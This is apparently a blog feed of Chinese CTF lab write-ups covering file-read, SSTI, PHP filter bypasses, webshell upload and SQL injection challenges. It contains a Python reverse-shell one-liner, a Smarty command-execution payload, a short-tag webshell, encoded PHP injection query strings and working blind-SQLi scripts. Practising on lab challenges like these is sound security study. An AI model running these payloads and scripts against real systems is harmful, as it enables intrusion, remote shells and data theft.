      <title>Picdown</title>
      <link href="/2021/06/25/Picdown-1/"/>
      <url>/2021/06/25/Picdown-1/</url>
      
        <content type="html"><![CDATA[<p>&lt;–more–&gt;</p><p>特征：打开题目有输入框<br>随便测试输入1，发现url变为?url=1,尝试输入/etc/passwd发现有任意文件读取漏洞，然后使用然后尝试读取/flag，得到flag，这是非预期解</p><p>预期解释：</p><p>查实读取进程：/proc/self/cmdline,发现有app.py，尝试读取，知道我们需要做的是找到那个密钥，但是存在密钥的文件被删除了，我们需要找到那个被删除的文件，找到密钥。</p><p>这里学到了一个命令，我们可以使用proc/self/fd/(1,2,3)…来进行读取</p><p>G2VxV+vYRoO3BvEJukrCz71nYHYM71GJTjL2cOtrKr0=</p><p>可以使用bp爆破</p><p>很奇怪，我把key搞上去提示说到，key错误。。。错误就进行url编码，有时候就很不明白啥时候要编码，啥时候不要编码</p><p>然后执行ls，发现没有回显，就可能是反弹shell</p><p>反弹shell原理：</p><p>攻击者进行监听，开启tcp服务</p><p>被攻击者连接端口    TCP服务</p><p>两者建立TCP连接</p><p>A通过TCP服务将待执行命令发送给B</p><p>B执行命令后将结果传递给A</p><p>语句：</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>整理一下</p><pre><code>import socket,subprocess(它允许你生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码),oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)//使用socket函数创建一个套接字，AF_INET表示是一个IPv4的套接字，SOCK_STREAM表示使用TCP流式sockets.connect((&quot;IP&quot;,端口))//连接到ip的套接字os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)//所以上面的函数作用就是把stdin,stdout,stderr的内容替换为套接字返回的内容，所以在本机nc监听就会创建一个套接字进程，是的在本地输入的内容就直接作为宿主机的stdin，stdout的内容也会在本地显示p=subprocess.call(就是执行指定的命令，返回命令执行的状态码)([&quot;/bin/sh&quot;,&quot;-i&quot;])</code></pre><p>然后连接反弹即可，但是我连接不上。。。</p><p>#后记</p><p>学到了</p><p>知识点：任意文件读取</p><p>界面出现?url=，并且输入/etc/passwd有会显</p><p>/proc/self/cmdline 查看进程</p><p>proc/self/fd/(1,2,3,4)文件描述符，题目中是用open打开的，于是会创建文件描述符，这样我们就可以通过/proc/self/fd/(1,2,3,4)去查找</p><p>然后key错误，记得编码</p><p>然后因为执行命令没有回显，所以要进行反弹shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP的Smarty模板</title>
      <link href="/2021/06/25/PHP%E7%9A%84Smarty%E6%A8%A1%E6%9D%BF/"/>
      <url>/2021/06/25/PHP%E7%9A%84Smarty%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>&lt;–more–&gt;</p><p>Smarty是一个PHP的模板引擎，提供让程序与页面分离的作用</p><p><img src="1.PNG"></p><p>这道题目很容易猜出，我们的ip受xxf的控制</p><p>将xxf改为：{system(‘cat /flag*’)}</p><p>需要记得，在打开一个题目的时候，一定要好好的看一下它是由什么构成的，这构成里面有没有漏洞</p><p>但是确实在XFF里面进行SSTI我还是没有想到的，做的时候就在想既然ip可以输出来信息，那么我该怎么整再能进行命令执行呢？本来想采用拼接夫进行拼接，就是ip=127…;ls但是不对。。。</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">https://blog.csdn.net/qq_45521281/article/details/107556915</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-EZPHP</title>
      <link href="/2021/06/21/BJDCTF-EZPHP/"/>
      <url>/2021/06/21/BJDCTF-EZPHP/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>在B站上看到有位UP主讲这个题目，就来做做看，这一道题目感觉学到了好多知识</p><span id="more"></span><h2>前置知识</h2><h3>$_SERVER[QUERY_STRING]</h3><p><img src="1.PNG"></p><p>输出你的查询语句，特性就是sever不会对query_string进行编码，但是request会</p><p>所以当这道题目涉及了</p><pre><code>if (    preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])    )      die(&#39;You seem to want to do something bad?&#39;);</code></pre><p>我们可以进行url编码</p><h3>preg_match</h3><p>忽略换行符匹配</p><p><img src="2.PNG"></p><h3>REQUEST超全局数组地冲突</h3><p>REQUEST是讲GET与POST地信息融合在一起形成一个大的数组，当POST与GET提交地是重复在一起地时候，根据PHP配置文件地信息，POST提交地数据将会覆盖GET</p><p><img src="3.PNG"></p><H3>data://text/plain的伪协议的利用</H3><p>与file_put_content的一同利用</p><p><img src="4.PNG"></p><p>我们知道file_put_contents（$a），应该是一个文件的名称，但是在这个里面我们的$h就只是一句话，就成功的将要求的语句读了出来</p><h3>sha1函数的绕过</h3><p>sha1函数是一个哈希加密</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>注意一下，a[]=1&amp;&amp;b[]=2，两个的值不能相等</p><h3>create_function代码注入</h3><p><img src="7.PNG"></p><p>create_function(‘$a’,’$a=$a+1;’)(第一个参数要加引号)</p><p>然后当我们想进行恶意注入的时候，我们可以将前者闭合、</p><p><img src="8.PNG"></p><p><img src="9.PNG"></p><p>//是单行注释，所以它正好注释掉了多余的}</p><h2>解题</h2><p><img src="10.PNG"></p><p>u1s1我真的超爱它这这张图，啥时候我也可以写出来这种代码。。。</p><p>ctrl+u检查源代码，发现</p><p><img src="11.PNG"></p><p>base嘛，64解不出来就换成了32，在百度上搜索base32解码，解出来1nD3x.php，这就是源码所在</p><p>xswl，我还想说有没有可能是?page=1nD3x.php,毕竟人家说的是真正的页面所在。。实践证明是错的，就直接在url上添加</p><p>源码分析：</p><p>有四个参数，shana,paswd,arg,code</p><pre><code>if($_SERVER) &#123; if (    preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])    )      die(&#39;You seem to want to do something bad?&#39;); &#125; </code></pre><p>如果它检查到我们传入参数以及参数的值含有这些元素，就是退出代码</p><p>这个是表明我们在接下来进行所有的传参都要先通过它这一关才可以，所以我们进行传参的时候根据前面讲的要进行url编码，注意&amp;与=不能进行编码</p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;     $file = $_GET[&quot;file&quot;];     echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;&#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); </code></pre><p>第一file里面不能够含有http,https而且debu！==aqua_is_cute，但是还要被匹配到，这样我们才能将我们的值赋值给file</p><pre><code>if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123;     if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))          die(&#39;fxck you! I hate English!&#39;); &#125; &#125; </code></pre><p>如果将REQUEST提交的值进行遍历，如果里面包含有英文字母，则吐出代码</p><p>我们知道，即使我们在提交参数的时候使用了url编码，但是赋给REQUEST的值仍然是解码后的值，那里面基本都是英文字母，肯定实惠被触碰的。。。但是我们上述也说了，我们可以用POST进行覆盖</p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</code></pre><p>$file里面的值如果不是debu_debu_aqua，则退出程序，根据上述我们可以采用data://text/plain伪协议</p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;extract($_GET[&quot;flag&quot;]);echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125; </code></pre><p>如果shana与paswd的值不相同但是它们的sha1值相同，就执行extract函数，会覆盖原有的值，extract是将数组里的值拆出来然后进行打散</p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;;$code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>其实看到code，跟arg应该可以想到一些东西</p><p><img src="12.PNG"></p><p>code是代码的意思，arg就是传参的参数（这点是我瞎猜的）</p><p>第一出现了extract，并且code跟arg在代码的前面都被赋予了初值为空，很明显我们要传入flag[code]与flag[arg]这两个参数，然后我们又可以看到$code(‘’, $arg)，那么我们就可以利用create_function进行注入，采用}与//</p><p>因为我们是通过arg来传递参数的，但是arg里面被过滤的东西太多了，就一般的命令执行作用的函数都被过滤了</p><p><img src="13.PNG"></p><p>get_defined_vars() 在不指定变量名称的情况下输出变量的值</p><p>最后我们构造</p><pre><code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code></pre><p>在bp上进行编码，但是由于bp是全编码，我们不能直接利用，必需将&amp;，‘%26’，=，‘%3d’进行替换</p><p><img src="14.PNG"></p><pre><code>flag就在这里，你能拿到它吗？array(13) &#123;  [&quot;_GET&quot;]=&gt;  array(5) &#123;[&quot;debu&quot;]=&gt;string(13) &quot;aqua_is_cute&quot;[&quot;file&quot;]=&gt;string(32) &quot;data://text/plain,debu_debu_aqua&quot;[&quot;shana&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;1&quot;&#125;[&quot;passwd&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;2&quot;&#125;[&quot;flag&quot;]=&gt;array(2) &#123;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;&#125;  &#125;  [&quot;_POST&quot;]=&gt;  array(2) &#123;[&quot;debu&quot;]=&gt;string(1) &quot;1&quot;[&quot;file&quot;]=&gt;string(1) &quot;1&quot;  &#125;  [&quot;_COOKIE&quot;]=&gt;  array(0) &#123;  &#125;  [&quot;_FILES&quot;]=&gt;  array(0) &#123;  &#125;  [&quot;_SERVER&quot;]=&gt;  array(55) &#123;[&quot;PHP_EXTRA_CONFIGURE_ARGS&quot;]=&gt;string(77) &quot;--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi&quot;[&quot;HOSTNAME&quot;]=&gt;string(12) &quot;fa84b83443af&quot;[&quot;PHP_INI_DIR&quot;]=&gt;string(18) &quot;/usr/local/etc/php&quot;[&quot;SHLVL&quot;]=&gt;string(1) &quot;1&quot;[&quot;HOME&quot;]=&gt;string(14) &quot;/home/www-data&quot;[&quot;PHP_LDFLAGS&quot;]=&gt;string(34) &quot;-Wl,-O1 -Wl,--hash-style=both -pie&quot;[&quot;PHP_CFLAGS&quot;]=&gt;string(83) &quot;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64&quot;[&quot;PHP_MD5&quot;]=&gt;string(0) &quot;&quot;[&quot;PHP_VERSION&quot;]=&gt;string(6) &quot;7.3.13&quot;[&quot;GPG_KEYS&quot;]=&gt;string(81) &quot;CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D&quot;[&quot;PHP_CPPFLAGS&quot;]=&gt;string(83) &quot;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64&quot;[&quot;PHP_ASC_URL&quot;]=&gt;string(62) &quot;https://www.php.net/get/php-7.3.13.tar.xz.asc/from/this/mirror&quot;[&quot;PHP_URL&quot;]=&gt;string(58) &quot;https://www.php.net/get/php-7.3.13.tar.xz/from/this/mirror&quot;[&quot;PATH&quot;]=&gt;string(60) &quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;[&quot;PHPIZE_DEPS&quot;]=&gt;string(78) &quot;autoconf         dpkg-dev dpkg         file         g++         gcc         libc-dev         make         pkgconf         re2c&quot;[&quot;PWD&quot;]=&gt;string(13) &quot;/var/www/html&quot;[&quot;PHP_SHA256&quot;]=&gt;string(64) &quot;57ac55fe442d2da650abeb9e6fa161bd3a98ba6528c029f076f8bba43dd5c228&quot;[&quot;FLAG&quot;]=&gt;string(4) &quot;null&quot;[&quot;USER&quot;]=&gt;string(8) &quot;www-data&quot;[&quot;HTTP_X_FORWARDED_PROTO&quot;]=&gt;string(4) &quot;http&quot;[&quot;HTTP_X_FORWARDED_FOR&quot;]=&gt;string(28) &quot;115.61.100.23, 115.61.100.23&quot;    [&quot;HTTP_UPGRADE_INSECURE_REQUEST    S&quot;]=&gt;string(1) &quot;1&quot;[&quot;HTTP_CONTENT_TYPE&quot;]=&gt;string(33) &quot;application/x-www-form-urlencoded&quot;[&quot;HTTP_CACHE_CONTROL&quot;]=&gt;string(9) &quot;max-age=0&quot;[&quot;HTTP_ACCEPT_LANGUAGE&quot;]=&gt;string(59) &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;[&quot;HTTP_ACCEPT_ENCODING&quot;]=&gt;string(13) &quot;gzip, deflate&quot;[&quot;HTTP_ACCEPT&quot;]=&gt;string(74) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;[&quot;HTTP_CONTENT_LENGTH&quot;]=&gt;string(2) &quot;13&quot;[&quot;HTTP_USER_AGENT&quot;]=&gt;string(78) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;[&quot;HTTP_HOST&quot;]=&gt;string(51) &quot;839262d1-07be-4447-9dd3-7b966aeb3b9d.node3.buuoj.cn&quot;[&quot;SCRIPT_FILENAME&quot;]=&gt;string(23) &quot;/var/www/html/1nD3x.php&quot;[&quot;REDIRECT_STATUS&quot;]=&gt;string(3) &quot;200&quot;[&quot;SERVER_NAME&quot;]=&gt;string(9) &quot;localhost&quot;[&quot;SERVER_PORT&quot;]=&gt;string(2) &quot;80&quot;[&quot;SERVER_ADDR&quot;]=&gt;string(13) &quot;172.16.179.69&quot;[&quot;REMOTE_PORT&quot;]=&gt;string(5) &quot;51570&quot;[&quot;REMOTE_ADDR&quot;]=&gt;string(13) &quot;115.61.100.23&quot;[&quot;SERVER_SOFTWARE&quot;]=&gt;string(12) &quot;nginx/1.16.1&quot;[&quot;GATEWAY_INTERFACE&quot;]=&gt;string(7) &quot;CGI/1.1&quot;[&quot;REQUEST_SCHEME&quot;]=&gt;string(4) &quot;http&quot;[&quot;SERVER_PROTOCOL&quot;]=&gt;string(8) &quot;HTTP/1.1&quot;[&quot;DOCUMENT_ROOT&quot;]=&gt;string(13) &quot;/var/www/html&quot;[&quot;DOCUMENT_URI&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;REQUEST_URI&quot;]=&gt;string(430) &quot;/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;[&quot;SCRIPT_NAME&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;CONTENT_LENGTH&quot;]=&gt;string(2) &quot;13&quot;[&quot;CONTENT_TYPE&quot;]=&gt;string(33) &quot;application/x-www-form-urlencoded&quot;[&quot;REQUEST_METHOD&quot;]=&gt;string(4) &quot;POST&quot;[&quot;QUERY_STRING&quot;]=&gt;string(419) &quot;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;[&quot;FCGI_ROLE&quot;]=&gt;string(9) &quot;RESPONDER&quot;[&quot;PHP_SELF&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;REQUEST_TIME_FLOAT&quot;]=&gt;float(1624368403.8835)[&quot;REQUEST_TIME&quot;]=&gt;int(1624368403)[&quot;argv&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(419) &quot;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;&#125;[&quot;argc&quot;]=&gt;int(1)  &#125;  [&quot;_REQUEST&quot;]=&gt;  array(5) &#123;[&quot;debu&quot;]=&gt;string(1) &quot;1&quot;[&quot;file&quot;]=&gt;string(1) &quot;1&quot;[&quot;shana&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;1&quot;&#125;[&quot;passwd&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;2&quot;&#125;[&quot;flag&quot;]=&gt;array(2) &#123;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;&#125;  &#125;  [&quot;file&quot;]=&gt;  string(32) &quot;data://text/plain,debu_debu_aqua&quot;  [&quot;shana&quot;]=&gt;  array(1) &#123;[0]=&gt;string(1) &quot;1&quot;  &#125;  [&quot;passwd&quot;]=&gt;  array(1) &#123;[0]=&gt;string(1) &quot;2&quot;  &#125;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;value&quot;]=&gt;  array(2) &#123;[&quot;code&quot;]=&gt;string(15) &quot;create_function&quot;[&quot;arg&quot;]=&gt;string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;  &#125;  [&quot;ffffffff11111114ggggg&quot;]=&gt;  string(89) &quot;Baka, do you think it&#39;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;&#125;</code></pre><p>这就是得到的全部的环境变量，然后成功的知道了flag实在rea1fl4g.php，然后我们尝试包含rea1fl4g.php，然后我们使用require（）进行包含，但是没有成功，使用取反。</p><p><img src="15.PNG"></p><p>但是还是没有，左后用为协议读取得到</p><p><img src="16.PNG"></p><p>因为使用unset将flag释放，所以我们不能在页面中直接读取到flag，只能使用为协议读取</p><p>bp执行成功时候的</p><pre><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 6</code></pre><p>竟然是cookie的问题？？？？？</p><p><img src="17.PNG"></p><p>会不会是因为这个</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红明谷-writeshell</title>
      <link href="/2021/06/19/%E7%BA%A2%E6%98%8E%E8%B0%B7-writeshell/"/>
      <url>/2021/06/19/%E7%BA%A2%E6%98%8E%E8%B0%B7-writeshell/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;    // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;    die(&#39;hacker!!!&#39;);&#125;else&#123;    return $input;&#125;&#125;function waf($input)&#123;if(is_array($input))&#123;    foreach($input as $key=&gt;$output)&#123;        $input[$key] = waf($output);    &#125;&#125;else&#123;    $input = check($input);&#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;case &#39;pwd&#39;:    echo $dir;    break;case &#39;upload&#39;:    $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;    waf($data);    file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>其实挺简单的，把shell写进去就好了</p><p>因为过滤了php，我们可以采用短标签，还用反引号，然后可以直接快一点的使用    </p><p>/t可以代替空格</p><pre><code>    &lt;?=`ls\t/*`?&gt;</code></pre><p>#反思</p><p>emmm，这道题目我想到了反引号，短标签，卡到了空格上，使用%09，%0c之类的，然后在群里问师傅们，F神给出了可以使用&lt;,代替空格，我在kali上使用是成功的，但是在这里没有成功，最终看WP学到了\t,另外还想到了，其实我可以直接cat /*不用在使用ls，去找文件了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql</title>
      <link href="/2021/06/16/ctfshow-sql/"/>
      <url>/2021/06/16/ctfshow-sql/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><h2>web 171-175</h2><p>学到的知识</p><p>1.to_base64</p><p>有题目说到，如果返回值里面匹配到了flag，那么则表示错了。这个点虽然在解决这些题目上没有什么作用，但是还是get到了一个小tips，如果我们要想要的到了东西里面存在flag，我们可以将其进行转换，转成to_base64</p><p><img src="1.PNG"></p><p>2.union select</p><p>我以前一直都是 1’ union select 1,(select * from flag) –+</p><p>之类的，但是我们实际上可以使用 1’ union select username,password from 表名 where …. limit …–+</p><p>3.into outfile ‘/var/www/var/1.txt’</p><p>则我们就可以将我们查询到的结果写道了一个1.txt文件里面了</p><p><img src="2.PNG"></p><p>为什么要采用用这个做法呢？因为这道题太狗了，过滤了0-127的字符什么都输不出来</p><p>4.replace</p><p><img src="3.PNG"></p><p>就是说174嘛，他不是不让输出数字，那么我们就可以将他输出的数字进行转换</p><p>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,’1’,’A’),’2’,’B’),’3’,’C’),’4’,’D’),’5’,’E’),’6’,’F’),’7’,’G’),’8’,’H’),’9’,’I’),’0’,’J’)</p><p>就这样子，就欧克了</p><p>表名列名可以用``抱起来，如果遇到那个空格过滤可以用这个</p><p>空格过滤还可以使用%09,%0a,%0b,%0c（制表符）</p><p><img src="4.PNG"></p><p><img src="5.jpg"></p><p>测试哪一点被过滤了，可以用简单的一段语句来测试 1’ or ‘a’=’a</p><p>有一道题目的注释符被过滤了，我灵机一动想到了1’union select 1,2,’3 嘿嘿</p><p>嘿嘿嘿，群主做的是知道了id才开始做的</p><h2></h2><pre><code>function waf($str)&#123;return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);  &#125;</code></pre><p>因为这道题目，我们可以看到这里的这个waf,emmmm,空格过滤，注释符过滤，into file过滤，select过滤，and，or过滤</p><p>所以只能考虑盲注</p><p><img src="5.PNG"></p><p>我在看群主的视频的时候，我真的是羡慕了，他python怎么跑的这么块，到我这里慢的要死。。。。。</p><p>因为该过滤的都被过滤了，所以我们可以考虑盲注</p><p>写一下脚本：</p><pre><code>import requestsurl=&#39;url&#39;flag=&#39;&#39;flagstr=&#39;&#123;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;payload=&#39;`ctfshow_user`where(substr(`pass`,&#123;&#125;,1)regexp(\&#39;&#123;&#125;\&#39;))&#39;for i in range:    for c in flagstr:        data=&#123;            &#39;tableName&#39;:payload.format(str(i),c)            &#125;        rep=requests.post(url,data)        if(rep.text.find($user_count = 1;&quot;&gt;0):            flag=flag+c            breakprint(flag)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN_2019_Final_12_Day2_Web1</title>
      <link href="/2021/06/15/CISCN-2019-Final-12-Day2-Web1/"/>
      <url>/2021/06/15/CISCN-2019-Final-12-Day2-Web1/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>最近要期末复习，就没有什么时间学习CTF，想着就跟着大佬的思路走一遍慢慢学</p><span id="more"></span><p>打开题目是一个登录框，然后尝试了，报错注入以及rollup发现我无列名注入竟然又不会了</p><p>害…明天下午要把sql注入好好在看一看</p><p>然后扫描，发现有robots.txt，我第一眼认为这没有啥东西</p><p><img src="1.png"></p><p>但是，我们看到这里就必需有警惕心，想一下为什么会提示到php.bak,那么就猜测课能存在一个备份泄露的问题</p><p>然后尝试index.php.bak,image.php.bak,user.php.bak,反正在ctrl u里面存在的东西都不能放过，然后造image.php.bak里面中找到了源码</p><p>代码审计</p><pre><code>&lt;?phpinclude &#39;config.php&#39;;//提示了存在config.php$id=isset($_GET[&#39;id&#39;])?$_GET[&#39;id&#39;]:&#39;1&#39;;$path=isset($_GET[&#39;path&#39;])?$_GET[&#39;path&#39;]:&#39;&#39;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot;.$row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);</code></pre><p><img src="2.PNG"></p><p>然后从这里可以看来，这道题目是典型的布尔盲注，id=0正好报错，id为1显示正确</p><p>主要考虑：</p><p>怎么绕过单引号过滤，闭合id的单一号，把危险代码放在path变量里</p><p>不能用单引号闭合单引号，但是我们可以用\转义单引号</p><p>所以构造我们传入\0，就会被加上\0，然后在str_replace那里变成了\，完成了转义</p><p>然后构造exp</p><pre><code>import requestsurl = &quot;http://f687a40e-08b5-4265-aa8c-140752053bfe.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;result = &quot;&quot;for i in range(1,30):low = 32high =128mid = (high+low)//2while(low&lt;high):    payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;.format(i,mid)    html = requests.get(url+payload)    print(low,high,mid,&quot;:&quot;)    print(url+payload)    if &quot;JFIF&quot; in html.text:        low = mid+1    else:        high = mid    mid = (high+low)//2if(low ==32 or high==128):    breakresult = result + chr(mid)print(result)print(&quot;flag: &quot; ,result)</code></pre><p>得到密码：<br>e18be75a8a54cf38a377</p><p>然后登录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowcms</title>
      <link href="/2021/06/07/ctfshowcms/"/>
      <url>/2021/06/07/ctfshowcms/</url>
      
